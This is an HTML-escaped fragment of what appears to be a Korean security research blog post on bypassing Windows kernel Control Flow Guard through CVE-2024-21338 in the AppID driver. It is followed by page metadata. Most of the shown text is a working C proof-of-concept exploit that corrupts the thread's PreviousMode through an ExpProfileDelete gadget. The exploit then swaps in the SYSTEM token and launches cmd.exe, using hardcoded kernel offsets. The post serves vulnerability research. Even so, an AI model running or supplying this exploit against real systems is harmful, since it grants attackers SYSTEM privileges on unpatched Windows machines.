&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* restoreBuffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)&lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR));
*restoreBuffer = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;

pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + &lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt;, (PVOID)restoreBuffer, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR), &amp;amp;dwbytes);
system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xCD94;&amp;#xAC00;&amp;#xD574; &amp;#xB2E4;&amp;#xC2DC; &amp;#xD574;&amp;#xBCF4;&amp;#xBA74;..&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%2010.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB807;&amp;#xAC8C; PreviousMode &amp;#xBCC0;&amp;#xC870;&amp;#xB85C; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC744; &amp;#xB2EC;&amp;#xC131;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB2E4;&amp;#xC2DC; kCFG &amp;#xC6B0;&amp;#xD68C;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC640;&amp;#xC11C;, CVE-2024-21338&amp;#xC758; untrusted pointer dereference &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70; &amp;#xD6C4; kCFG &amp;#xBE44;&amp;#xD2B8;&amp;#xB9F5;&amp;#xC5D0; &amp;#xB4F1;&amp;#xB85D;&amp;#xB41C; &amp;#xC815;&amp;#xC0C1;&amp;#xC801;&amp;#xC778; &amp;#xCEE4;&amp;#xB110; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xBA74; PreviouMode&amp;#xB97C; &amp;#xBCC0;&amp;#xC870;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACA0;&amp;#xC8E0;. &amp;#xADFC;&amp;#xB370;.. &amp;#xB9CE;&amp;#xACE0; &amp;#xB9CE;&amp;#xC740; &amp;#xCEE4;&amp;#xB110; &amp;#xD568;&amp;#xC218; &amp;#xC911; &amp;#xC774;&amp;#xB7F0; &amp;#xD568;&amp;#xC218;&amp;#xB294; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xCC3E;&amp;#xC544;&amp;#xC57C; &amp;#xD560;&amp;#xAE4C;&amp;#xC694; :(&lt;/p&gt;
&lt;p&gt;&amp;#xC8FC;&amp;#xBAA9;&amp;#xD574;&amp;#xBCFC;&amp;#xB9CC;&amp;#xD55C; &amp;#xD568;&amp;#xC218; &amp;#xC911; &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; &amp;#xCEE4;&amp;#xB110; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xB2F9; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xB294; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xB294; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8; &amp;#xC8FC;&amp;#xC18C;&amp;#xC758; &amp;#xB808;&amp;#xD37C;&amp;#xB7F0;&amp;#xC2A4; &amp;#xCE74;&amp;#xC6B4;&amp;#xD2B8; &amp;#xD544;&amp;#xB4DC;(&amp;#xC624;&amp;#xD504;&amp;#xC14B; -0x30) &amp;#xB97C; &amp;#xAC10;&amp;#xC18C;&amp;#xC2DC;&amp;#xD0A4;&amp;#xBBC0;&amp;#xB85C; PreviousMode&amp;#xC758; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xAC12;&amp;#xC778; 1&amp;#xC5D0;&amp;#xC11C; &amp;#xCEE4;&amp;#xB110;&amp;#xBAA8;&amp;#xB4DC; &amp;#xAC12;&amp;#xC778; 0&amp;#xC73C;&amp;#xB85C; &amp;#xBCC0;&amp;#xC870;&amp;#xD558;&amp;#xAE30; &amp;#xB531; &amp;#xC88B;&amp;#xC740; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xAC00; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7EC;&amp;#xB098; &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; &amp;#xC744; &amp;#xBC14;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xAE30;&amp;#xC5D0;&amp;#xB294; &amp;#xD55C; &amp;#xAC00;&amp;#xC9C0; &amp;#xC81C;&amp;#xC57D;&amp;#xC0AC;&amp;#xD56D;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xAE4C; &amp;#xBC84;&amp;#xADF8; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70; &amp;#xC2DC;&amp;#xC810;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD588;&amp;#xB358; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790; &amp;#xAC12;&amp;#xC744; &amp;#xC9C1;&amp;#xC811; &amp;#xC81C;&amp;#xC5B4;&amp;#xD560; &amp;#xC218;&amp;#xB294; &amp;#xC5C6;&amp;#xACE0;, &amp;#xC778;&amp;#xC790;&amp;#xAC00; &amp;#xCC38;&amp;#xC870;&amp;#xD558;&amp;#xB294; &amp;#xAC12;&amp;#xB9CC; &amp;#xAC04;&amp;#xC811;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC81C;&amp;#xC5B4;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xC8E0;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;rcx&amp;#xB97C; &amp;#xD55C; &amp;#xBC88; &amp;#xCC38;&amp;#xC870;&amp;#xD55C; &amp;#xAC12;&amp;#xC744; &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD574; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC9C1;&amp;#xC811; &amp;#xC81C;&amp;#xC5B4; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xB294;  wrapper &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xB610; &amp;#xCC3E;&amp;#xC544;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xC758; &amp;#xD06C;&amp;#xB85C;&amp;#xC2A4; &amp;#xB808;&amp;#xD37C;&amp;#xB7F0;&amp;#xC2A4; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB97C; &amp;#xCB49; &amp;#xCC3E;&amp;#xC544;&amp;#xBCF4;&amp;#xBA74; &amp;#xD574;&amp;#xB2F9; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xB9CC;&amp;#xC871;&amp;#xD558;&amp;#xB294; &lt;code&gt;ExpProfileDelete&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs lua&#34;&gt;void __fastcall ExpProfileDelete(__int64 a1)
{
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(_QWORD *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;) )
  {
    KeStopProfile(*(_QWORD *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;));
    MmUnmapLockedPages(*(PVOID *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;), *(PMDL *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;56&lt;/span&gt;));
    MmUnlockPages(*(PMDL *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;56&lt;/span&gt;));
    ExFreePoolWithTag(*(PVOID *)(a1 + &lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(_QWORD *)a1 )
    ObfDereferenceObjectWithTag(*(PVOID *)a1, &lt;span class=&#34;hljs-number&#34;&gt;0x66507845&lt;/span&gt;u);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xCC38;&amp;#xC870;&amp;#xD55C; &amp;#xAC12;&amp;#xC744; &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD574; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB124;&amp;#xC694;. &amp;#xC774;&amp;#xB7EC;&amp;#xBA74; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C;&amp;#xC758; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xB97C; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC9C1;&amp;#xC811; &amp;#xCEE8;&amp;#xD2B8;&amp;#xB864;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%2011.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC6B0;&amp;#xC120; CVE-2024-21338 &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;ExpProfileDelete&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xBA74; kCFG&amp;#xAC00; &amp;#xC6B0;&amp;#xD68C;&amp;#xB418;&amp;#xACE0; &lt;code&gt;ExpProfileDelete&lt;/code&gt; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xC810;&amp;#xD504;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;ExpProfileDelete&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xC8FC;&amp;#xC18C;&amp;#xB294; Part 1&amp;#xC758; &lt;code&gt;NtQuerySystemInformation&lt;/code&gt; &amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xAD6C;&amp;#xD55C; ntoskrnle.exe &amp;#xBCA0;&amp;#xC774;&amp;#xC2A4;&amp;#xC640; &amp;#xC624;&amp;#xD504;&amp;#xC14B; &amp;#xACC4;&amp;#xC0B0;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%2012.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ExpProfileDelete&lt;/code&gt; &amp;#xB0B4;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;ObfDereferenceObjectWithTag&lt;/code&gt; &amp;#xB9E4;&amp;#xD06C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C; &amp;#xC2DC;&amp;#xC810;&amp;#xC758; rcx&amp;#xAC00; &lt;code&gt;0x4141414141414141&lt;/code&gt;&amp;#xB85C; &amp;#xB098;&amp;#xC624;&amp;#xB124;&amp;#xC694;. &amp;#xB4DC;&amp;#xB514;&amp;#xC5B4; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xAC10;&amp;#xC18C;&amp;#xC2DC;&amp;#xD0AC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ExpProfileDelete&lt;/code&gt; &amp;#xAC00; &amp;#xC544;&amp;#xB2C8;&amp;#xB354;&amp;#xB77C;&amp;#xB3C4; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xB9CC;&amp;#xC871;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB294; &amp;#xB354; &amp;#xC788;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB2E8;, &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xB85C;&amp;#xC9C1;&amp;#xC774; &amp;#xBCF5;&amp;#xC7A1;&amp;#xD560;&amp;#xC218;&amp;#xB85D; &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xC758;&amp;#xB3C4;&amp;#xD55C; &amp;#xB3D9;&amp;#xC791; &amp;#xC678; &amp;#xB2E4;&amp;#xB978; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA70; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD560; &amp;#xAC00;&amp;#xB2A5;&amp;#xC131;&amp;#xC774; &amp;#xB192;&amp;#xC544;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xBE44;&amp;#xAD50;&amp;#xC801; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD0C0;&amp;#xAC9F;&amp;#xC73C;&amp;#xB85C; &amp;#xCC3E;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC88B;&amp;#xC744; &amp;#xAC83; &amp;#xAC19;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; CVE-2024-21338 &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC73C;&amp;#xB85C; PreviousMode&amp;#xB97C; &amp;#xBCC0;&amp;#xC870;&amp;#xD558;&amp;#xACE0; Token Swapping&amp;#xC744; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xCD5C;&amp;#xC885; PoC &amp;#xCF54;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;defines.h&amp;quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; STATUS_INFO_LENGTH_MISMATCH 0xc0000004&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; DEVICE_NAME &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;\\\\?\\AppID&amp;quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-comment&#34;&gt;// IOCTL 0x22A018&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;struct&lt;/span&gt; {&lt;/span&gt;
	PVOID arg1;
	PVOID objptr;
	PVOID cfgptr;
	PVOID unknown;
} INPUT_BUFFER;

_NtQuerySystemInformation pNtQuerySystemInformation;
_NtFsControlFile pNtFsControlFile;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVIrtualMemory;
_NtDeviceIoControlFile pNtDeviceIoControlFile;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;GetNtFunction&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{...}
&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetImageBase&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* ModuleName)&lt;/span&gt; &lt;/span&gt;{...}
&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetFILE_OBJECT_Address&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;{...}
&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PULONGLONG objptr, ULONG pid, HANDLE handle)&lt;/span&gt;&lt;/span&gt;{...}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
	PVOID KTHREAD = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	PVOID SYSTEM_EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	PVOID EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	PVOID PreviousMode = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	PVOID NTOSKRNL_BASE = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;

	ULONG dwbytes = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
	GetNtFunction();

	DWORD pid = GetCurrentProcessId();

	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	GetObj(&amp;amp;KTHREAD, pid, hThread);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current KTHREAD: %p\n&amp;quot;&lt;/span&gt;, KTHREAD);

	PreviousMode = (UINT64)KTHREAD + &lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt;;
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] PreviousMode address: %p\n&amp;quot;&lt;/span&gt;, PreviousMode);

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	GetObj(&amp;amp;EPROCESS, pid, hProc);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current EPROCESS: %p\n&amp;quot;&lt;/span&gt;, EPROCESS);

	GetObj(&amp;amp;SYSTEM_EPROCESS, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, (HANDLE)&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] System EPROCESS: %p\n&amp;quot;&lt;/span&gt;, SYSTEM_EPROCESS);

	NTOSKRNL_BASE = GetImageBase(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ntoskrnl.exe&amp;quot;&lt;/span&gt;);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] ntoskrnl.exe base address : %p\n&amp;quot;&lt;/span&gt;, NTOSKRNL_BASE);

	PVOID ExpProfileDelete = (UINT64)NTOSKRNL_BASE + &lt;span class=&#34;hljs-number&#34;&gt;0xA01FD0&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;// kcfg bypass gadget&lt;/span&gt;
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] ExpProfileDelete function address : %p\n&amp;quot;&lt;/span&gt;, ExpProfileDelete);

	PVOID FILE_OBJECT = GetFILE_OBJECT_Address();

	INPUT_BUFFER buffer = { &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, };
	HANDLE dHandle;
	dHandle = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, CREATE_NEW, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;);

	buffer.arg1 = (UINT64)PreviousMode + &lt;span class=&#34;hljs-number&#34;&gt;0x30&lt;/span&gt;;		
	buffer.objptr = FILE_OBJECT;					
	buffer.cfgptr = &amp;amp;ExpProfileDelete;				
	buffer.unknown = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;							

	IO_STATUS_BLOCK ioStatus;

	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (pNtDeviceIoControlFile(dHandle, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;ioStatus, &lt;span class=&#34;hljs-number&#34;&gt;0x22A018&lt;/span&gt;, &amp;amp;buffer, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(buffer), &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;dwbytes) != NOERROR) {
		&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;NtDeviceIoControlFile Failed, 0x%x\n&amp;quot;&lt;/span&gt;, GetLastError());
	}

	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, (ULONGLONG)SYSTEM_EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(ULONGLONG), &amp;amp;dwbytes);

	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* restoreBuffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;*)&lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR));
	*restoreBuffer = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;

	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + &lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt;, (PVOID)restoreBuffer, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(CHAR), &amp;amp;dwbytes);

	system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;);

	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xC804;&amp;#xCCB4; &amp;#xC18C;&amp;#xC2A4;&amp;#xCF54;&amp;#xB4DC;: &lt;a href=&#34;https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c&#34;&gt;https://github.com/hackyboiz/kcfg-bypass/blob/main/CVE-2024-21338.c&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%2013.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC6D0;&amp;#xB798; &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xC138; &amp;#xAC00;&amp;#xC9C0; &amp;#xAE30;&amp;#xBC95;&amp;#xC744; &amp;#xBAA8;&amp;#xB450; &amp;#xC18C;&amp;#xAC1C;&amp;#xD558;&amp;#xB824;&amp;#xACE0; &amp;#xD588;&amp;#xC9C0;&amp;#xB9CC;.. &amp;#xC0DD;&amp;#xAC01;&amp;#xBCF4;&amp;#xB2E4; &amp;#xAE38;&amp;#xC5B4;&amp;#xC9C4; &amp;#xAD00;&amp;#xACC4;&amp;#xB85C; &amp;#xB2E4;&amp;#xC74C; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xB0A8;&amp;#xC740; &amp;#xB450; &amp;#xAC00;&amp;#xC9C0; &amp;#xAE30;&amp;#xBC95;&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC815;&amp;#xB9AC;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E;.. (&amp;#xAD1C;&amp;#xCC2E;&amp;#xC544; &amp;#xB098;&amp;#xD55C;&amp;#xD150; &amp;#xC124; &amp;#xC5F0;&amp;#xD734;&amp;#xAC00; &amp;#xC788;&amp;#xC5B4;)&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; Part 3&amp;#xB85C; &amp;#xB2E4;&amp;#xC2DC; &amp;#xCC3E;&amp;#xC544;&amp;#xC624;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; :) 2025&amp;#xB144;&amp;#xC5D0;&amp;#xB3C4; &amp;#xC6B0;&amp;#xB9AC; &amp;#xC5F4;&amp;#xC2EC;&amp;#xD788; &amp;#xACF5;&amp;#xBD80;&amp;#xD574;&amp;#xC694;&lt;/p&gt;
 - hack &amp; life">
  <meta property="og:image" content="https://hackyboiz.github.io2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image.png">
  <meta property="og:url" content="https://hackyboiz.github.io/">

  <link rel="canonical" href="https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/">

  <title>[Research] Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 (Ko) - hackyboiz</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
